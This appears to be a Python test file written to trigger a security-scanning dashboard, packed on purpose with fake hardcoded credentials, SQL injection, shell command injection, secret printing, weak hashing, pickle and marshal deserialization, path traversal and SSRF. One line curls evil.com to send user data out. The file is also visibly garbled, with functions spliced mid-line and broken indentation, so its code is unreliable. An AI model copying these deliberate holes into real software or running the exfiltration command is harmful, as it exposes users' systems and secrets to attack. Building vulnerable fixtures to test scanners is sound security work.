#!/usr/bin/env python3
"""
🚨 DASHBOARD INTEGRATION TEST - PR #16
Testing if PR analysis results show up on the AppSecInABox dashboard.
This file contains multiple critical vulnerabilities to trigger security analysis.
"""

import os
import subprocess
import sqlite3
import hashlib
import base64
import pickle
import urllib.request
import random
import json

# 🚨 CRITICAL: Hardcoded production credentials
DATABASE_PASSWORD = "dashboard_test_password_456!"
API_SECRET_KEY = "sk-live-dashboard-test-xyz7890123456789"
AWS_ACCESS_KEY_ID = "AKIADASHBOARDTEST123456789"
AWS_SECRET_ACCESS_KEY = "SECRETDASHBOARDTEST123456789"
STRIPE_SECRET_KEY = "sk_live_dashboard_test_456789abcdef"
JWT_SECRET = "jwt_secret_dashboard_test_456!"
GITHUB_TOKEN = "ghp_dashboard_test_1234567890abcdef1234567890abcdef12345678"

def vulnerable_login(username, password):
      """
          🚨 CRITICAL: SQL Injection vulnerability
              """
      # Direct string concatenation - SQL injection
      query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
      print(f"Executing: {query}")

    # Execute without parameterization
      conn = sqlite3.connect('users.db')
      cursor = conn.cursor()
      cursor.execute(query)  # 🚨 SQL Injection!
    result = cursor.fetchone()
    conn.close()
    return result

def command_injection(user_input):
      """
          🚨 CRITICAL: Command injection vulnerability
              """
      # Direct command execution with user input
      os.system(f"echo 'User: {user_input}' > /tmp/user_log.txt")  # 🚨 Command injection!

    # More command injection
      subprocess.run(f"ls -la {user_input}", shell=True)  # 🚨 Command injection!

    # Even more dangerous
      os.system(f"curl -X POST http://evil.com/steal?data={user_input}")  # 🚨 Command injection!

def information_disclosure():
      """
          🚨 CRITICAL: Information disclosure
              """
      # Print all secrets
      print(f"Database password: {DATABASE_PASSWORD}")
      print(f"API secret: {API_SECRET_KEY}")
      print(f"AWS credentials: {AWS_ACCESS_KEY_ID}:{AWS_SECRET_ACCESS_KEY}")
      print(f"Stripe key: {STRIPE_SECRET_KEY}")
      print(f"JWT secret: {JWT_SECRET}")
      print(f"GitHub token: {GITHUB_TOKEN}")

def weak_cryptography():
      """
          🚨 CRITICAL: Weak cryptography
              """
      # MD5 is brokenmalicious_marshal_data")  # 🚨 Unsafe deserialization!

  def path_traversal(filename):
        """
            🚨 CRITICAL: Path traversal vulnerability
                """
        # No validation of file path
    with open(filename, 'r') as f:  # 🚨 Path traversal!
              content = f.read()
              print(f"File content: {content}")

def ssrf_vulnerability(url):
      """
          🚨 CRITICAL: Server-Side Request Forgery
              """
      # No URL validation
      response = urllib.request.urlopen(url)  # 🚨 SSRF!
      return response.read()

  def xss_vulnerability(user
      weak_hash = hashlib.md5(DATABASE_PASSWORD.encode()).hexdigest()
      print(f"Weak MD5 hash: {weak_hash}")

    # SHA1 is also weak
      weak_sha1 = hashlib.sha1(DATABASE_PASSWORD.encode()).hexdigest()
      print(f"Weak SHA1 hash: {weak_sha1}")

def unsafe_deserialization():
      """
          🚨 CRITICAL: Unsafe deserialization
              """
      # Pickle is dangerous
      malicious_pickle = base64.b64encode(b"malicious_pickle_data").decode()
      pickle.loads(base64.b64decode(malicious_pickle))  # 🚨 Unsafe deserialization!

    # Marshal is also dangerous
      import marshal
      marshal.loads(b"
